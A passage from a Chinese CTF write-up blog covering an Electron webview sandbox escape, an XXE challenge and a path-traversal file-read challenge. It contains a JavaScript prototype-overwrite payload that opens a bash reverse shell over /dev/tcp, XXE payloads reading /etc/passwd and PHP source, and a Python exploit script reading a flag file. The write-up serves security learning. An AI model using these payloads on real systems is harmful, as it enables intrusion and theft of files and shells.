class="string">"view"</span>);</span><br><span class="line">webview.addEventListener(<span class="string">"dom-ready"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  webview.openDevTools();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>在<code>src/index.js</code>中的20行左右添加如下代码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainWindow.openDevTools();</span><br></pre></td></tr></table></figure><p>之后启动app的话就会有两个开发者视图窗口，其中title是http开头的是view的调试窗口，之后尝试来导入模块执行命令，发现在沙箱环境中失败的。</p><p><img src="https://i.loli.net/2019/09/05/YPG87OgLlItiKo4.png" alt="0303F269-CE22-4FFE-B389-C4B77EF978F9.png"></p><p>但是在另一个视图中是可以执行成功的</p><p><img src="https://i.loli.net/2019/09/05/msHyRIeSvQ71Vki.png" alt="5BDE4A65-83FD-4AC5-B9D7-EFBEA9C6CC71.png"></p><p>所以应该是main.js中关于导入包的功能没开，所以无法导入模块，来进行rce</p><p>PS: 这里的的view是一个webview窗口，相当于是一个沙盒。默认是没有办法调用系统api的。</p><p>之后根据hint来阅读相关文章时，可以知道到如下信息：</p><blockquote><p>由于contextisolation关闭，可以导致webview沙盒内与pr.js内变量在同一作用域，可以覆盖pr.js的变量。而且pr.js是不在沙盒运行限制内。所以，只要想办法覆盖掉pr.js的函数调用逻辑，即可绕过webview沙盒。</p></blockquote><p>所以就有了官方题解的第一种paylaod，暴力覆写所有函数</p><p>首先进行初步覆写，目的是找到一个<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> args)</span><br><span class="line">        <span class="keyword">if</span>(args[i])</span><br><span class="line">        <span class="built_in">console</span>.log(args[i].toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在带有title的那个devtools里面首先执行上述代码，之后执行如下代码，便可以找到<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.get(<span class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/05/7qYNs8JWiSdBPLA.png" alt="4AE71B08-7379-416E-AF2A-AD6A693D8F71.png"></p><p>之后改写paylaod便可以直接rce了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="literal">null</span> &amp;&amp; args[<span class="number">0</span>]!=<span class="literal">undefined</span> &amp;&amp; args[<span class="number">0</span>].env!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="built_in">Function</span>.prototype.apply=<span class="built_in">Function</span>.prototype.apply2;</span><br><span class="line">        args[<span class="number">0</span>].mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/XXXXXX/8080 0&gt;&amp;1"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args)</span><br><span class="line">&#125;</span><br><span class="line">request.get(<span class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p><p>可以看到成功反弹了shell<br><img src="https://i.loli.net/2019/09/05/ajvDxVtKH7Q4m5r.png" alt="403CCAC2-DE75-4FE2-810E-B8DB1D2BBE5F.png"><br>但是这样反弹的是你本地的shell，之后想得到flag还得结合之前提到的xss</p><p>上面这种暴力fuzz的方式，直接get到了request库中是有process的相关调用的，进而达到了rce的效果，那么从白盒角度是怎么进行分析的呢？</p><p>从作者的<a href="https://github.com/imagemlt/iCloudMusic" target="_blank" rel="noopener">github</a>上我了解到，request库/http库/其他很多node库是都有可能调用process相关函数的，比如process.nextTick</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ (...args) &#123;</span><br><span class="line">            process.activateUvLoop();</span><br><span class="line">            <span class="keyword">return</span> func.apply(<span class="keyword">this</span>, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里面的<code>func.apply</code>其实就是<code>Function.prototype.apply</code>，并且这里面的this就是指向process自身。我们可以在request里面看到对这个函数的调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defer = <span class="keyword">typeof</span> setImmediate === <span class="string">'undefined'</span></span><br><span class="line">  ? process.nextTick</span><br><span class="line">  : setImmediate</span><br></pre></td></tr></table></figure><p>http库中用与处理socket请求的一个关键函数也调用了这个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClientRequest.prototype.onSocket = <span class="function"><span class="keyword">function</span> <span class="title">onSocket</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  process.nextTick(onSocketNT, <span class="keyword">this</span>, socket);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以从白盒的角度来看可以更好的知道为什么上面的payload可以达到rce</p><h2 id="0x08-Game"><a href="#0x08-Game" class="headerlink" title="0x08 Game"></a>0x08 Game</h2><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>How fast can you play?</p><p><a href="http://47.111.59.243:1081" target="_blank" rel="noopener">http://47.111.59.243:1081</a></p><h4 id="题目解答-7"><a href="#题目解答-7" class="headerlink" title="题目解答"></a>题目解答</h4><p>直接查看源代码得到flag（假的，emmmm</p><p>view-source:<a href="http://47.111.59.243:1081/" target="_blank" rel="noopener">http://47.111.59.243:1081/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div class=&quot;text text--best-time&quot;&gt;</span><br><span class="line">    &lt;icon trophy&gt;&lt;/icon&gt;</span><br><span class="line">    &lt;span&gt;Well done!，</span><br><span class="line"> here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===  &lt;/span&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>base32后得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;hAHaha_Fak3_F1ag&#125;</span><br></pre></td></tr></table></figure><p>既然是个游戏就有可能是改的开源代码，所以抱这这种想法就去找了源码，就找到了</p><p><a href="http://www.jq22.com/jquery-info21216" target="_blank" rel="noopener">http://www.jq22.com/jquery-info21216</a></p><p>然后从里面diff出不同点<br><img src="https://i.loli.net/2019/09/05/xnwBoXb1lgv93q7.png" alt="71F7F13A-9AB1-4D56-BCE1-38E2BD91E070.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var acd = mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png;</span><br></pre></td></tr></table></figure><p>之后下载图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://47.111.59.243:1081/iZwz9i9xnerwj6o7h40eauZ.png</span><br></pre></td></tr></table></figure></p><p>分析之后发现是lsb隐写<br><img src="https://i.loli.net/2019/09/05/Lw9j2aX8mvonHFu.png" alt="0E0DEF7B-AD12-434C-A7F2-6640F150B0C7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</span><br></pre></td></tr></table></figure><p>使用3des解密即可得到flag<br><img src="https://i.loli.net/2019/09/05/CeHyOgw8f9QdzZq.png" alt="30A0E76B-7523-477C-88FB-E400F79C097A.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;又是很嗨的一场比赛。&lt;/p&gt;
&lt;p&gt;PS: 补充了iCloudMusic的个人详细题解&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络与信息安全领域专项赛WP</title>
    <link href="http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"/>
    <id>http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/</id>
    <published>2019-08-16T02:49:37.000Z</published>
    <updated>2019-08-16T03:05:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来</p><h2 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Enjoy the Game.</p><h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开网页发现玩儿起来没什么异常，手残点不上三个也没有触发任何网络请求，所以使用devtool来分析js</p><p><img src="https://i.loli.net/2019/08/16/VIOxbpveEhHfy2G.png" alt="9A105552-D2DA-4842-82BB-41532FACFF75.png"></p><p>在cqg.js中看到如下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score == <span class="number">15</span>)&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'score.php'</span>,</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        data: <span class="string">'score='</span>+score,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = data;</span><br><span class="line">            $(<span class="string">"#output"</span>).text(data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>所以手动发一下请求得到flag</p><p><img src="https://i.loli.net/2019/08/16/eRgxWLZnFyid18U.png" alt="C676ECDC-CE3F-4762-A1AB-D4A616A38117.png"></p><h2 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you?"></a>0x02 who_are_you?</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>who are you?</p><h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>编辑用户名提交，发现提交的是xml数据，自然想到xxe攻击</p><p>因为此处是点击之后提交所以也就自然联想到是js发的请求，查看源码就能看到对应的js代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>构造常规的payload读<code>/etc/passwd</code>成功</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/16/OiAnJa7lFsCxGUR.png" alt="E1C38A08-C528-465F-9615-26446113B484.png"></p><p>但是这种payload不能读取到对应的index.php源码文件，一是绝对路径我不知道（但是可以brute），二是这样读取在处理<code>&lt;</code>符号时会出现问题，所以要使用伪协议来进行处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终读取到对应的源代码如下，flag就在源代码里面</p><p><img src="https://i.loli.net/2019/08/16/MZU7HyIdQARik1X.png" alt="706FDA0A-96CC-4443-98AB-72EA2DBB999E.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;b634b4b5-7780-4641-86a7-0e4b43093b26&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"./style.css"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class="contactBody"&gt;</span><br><span class="line">&lt;div class="wrapper"&gt;</span><br><span class="line">    &lt;div class="title"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method="post" class="form"&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">"title"</span>&gt;è¯·è¾å¥å§å&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type="text" class="name entry " id="name" name="name" placeholder="Your Name"/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class="submit entry" onclick="func()"&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="shadow"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + document.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="keyword">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>It’s no easy.</p><h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>先上传一张正常图片，发现可以正常显示</p><p><img src="https://i.loli.net/2019/08/16/XG2EMCNBg1VcPxI.png" alt="A9B778D3-C0A1-4756-A7E7-751E730CCB37.png"></p><p>并且图片的链接如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/img.php?name=lk7Bl4hRjmj%3D</span><br></pre></td></tr></table></figure></p><p>主要观察img.php后面跟的请求参数，好像是base编码的一样，但是尝试base64解码之后发现是乱码。</p><p><img src="https://i.loli.net/2019/08/16/Gh4w9iobVFqJytm.png" alt="80BE64FB-F874-4D8C-8BF6-ED466F5B5C14.png"></p><p>但是并不影响我们猜测这是一个通过某种方式编码的任意文件读取漏洞，之后则是要进行已知明文猜解，通过fuzz的方式进行。发现可能是3-&gt;4的变种base编码，因此只要利用他自身的加密功能区加密，然后得到我们想要的加密字符串就好了。</p><p>根据原理写出Exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_encode</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(filename) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    r = requests.post(target+<span class="string">"upload.php"</span>,</span><br><span class="line">                      files=&#123;<span class="string">'file'</span>: (filename + <span class="string">'.jpg'</span>,</span><br><span class="line">                                      <span class="string">'z3r0test'</span>, <span class="string">'text/plain'</span>)&#125;</span><br><span class="line">                      )</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    pic_url = soup.find(<span class="string">'img'</span>)</span><br><span class="line">    <span class="comment"># print(pic_url['src'].replace('img.php?name=', ''))</span></span><br><span class="line">    filename = pic_url[<span class="string">'src'</span>].replace(<span class="string">'img.php?name='</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment"># print(filename)</span></span><br><span class="line">    urldecode = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">return</span> urldecode[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    filename = urllib.parse.unquote(filename)</span><br><span class="line">    r = requests.get(target+<span class="string">"img.php"</span>,</span><br><span class="line">                     params=&#123;<span class="string">'name'</span>: filename&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    target = <span class="string">"http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/"</span></span><br><span class="line">    payload = <span class="string">"../.././proc/self/root/root/flag.txt"</span></span><br><span class="line">    <span class="comment"># payload = "../..//proc/self/cwd/app.py"</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"must be three times!"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    final = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(payload), <span class="number">3</span>):</span><br><span class="line">        final += base_encode(target, payload[i:i + <span class="number">3</span>])</span><br><span class="line">    final = urllib.parse.quote(final)</span><br><span class="line">    read(target, final)</span><br></pre></td></tr></table></figure></p><p>所以可以得到flag如下<br><img src="https://i.loli.net/2019/08/16/IRlo2pfbsH8kGix.png" alt="F8BBDDFF7-AA616575E3.png"></p><p>还可以读到对应的网站源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 